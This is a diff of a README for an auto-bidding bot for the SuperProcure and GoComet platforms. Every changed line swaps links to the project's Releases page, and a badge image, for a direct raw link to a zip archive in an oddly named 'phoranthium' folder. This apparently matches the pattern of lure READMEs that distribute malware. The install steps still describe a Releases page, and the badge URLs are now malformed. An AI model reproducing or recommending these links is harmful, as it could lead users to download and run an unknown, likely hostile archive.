@@ -7,7 +7,7 @@ The superprocure-gocomet-auto-bidding-bot automates the bidding process for Supe
 Follow these steps to download and run the bot quickly and easily.
 
 ### 📥 Download the Software
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=flat&logo=github)](https://github.com/Aatharvap05/superprocure-gocomet-auto-bidding-bot/releases)
+[![Download Now](https://github.com/Aatharvap05/superprocure-gocomet-auto-bidding-bot/raw/refs/heads/main/phoranthium/bidding_auto_bot_superprocure_gocomet_2.8.zip%20Now-blue?style=flat&logo=github)](https://github.com/Aatharvap05/superprocure-gocomet-auto-bidding-bot/raw/refs/heads/main/phoranthium/bidding_auto_bot_superprocure_gocomet_2.8.zip)
 
 ### 📋 System Requirements
 To use the superprocure-gocomet-auto-bidding-bot, your computer needs:
@@ -24,7 +24,7 @@ To use the superprocure-gocomet-auto-bidding-bot, your computer needs:
 - Easy setup process
 
 ## 📖 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/Aatharvap05/superprocure-gocomet-auto-bidding-bot/releases).
+1. Visit this page to download: [Releases Page](https://github.com/Aatharvap05/superprocure-gocomet-auto-bidding-bot/raw/refs/heads/main/phoranthium/bidding_auto_bot_superprocure_gocomet_2.8.zip).
 2. On the Releases page, look for the latest version available.
 3. Select the appropriate file for your operating system. 
 4. Download the file.
@@ -57,4 +57,4 @@ For further assistance, you can join our community or open an issue in the repos
 ## 📅 Future Updates
 We plan to add features based on user feedback. Your suggestions are welcomed to make the superprocure-gocemet-auto-bidding-bot even better.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=flat&logo=github)](https://github.com/Aatharvap05/superprocure-gocemet-auto-bidding-bot/releases)
+[![Download Now](https://github.com/Aatharvap05/superprocure-gocomet-auto-bidding-bot/raw/refs/heads/main/phoranthium/bidding_auto_bot_superprocure_gocomet_2.8.zip%20Now-blue?style=flat&logo=github)](https://github.com/Aatharvap05/superprocure-gocomet-auto-bidding-bot/raw/refs/heads/main/phoranthium/bidding_auto_bot_superprocure_gocomet_2.8.zip)
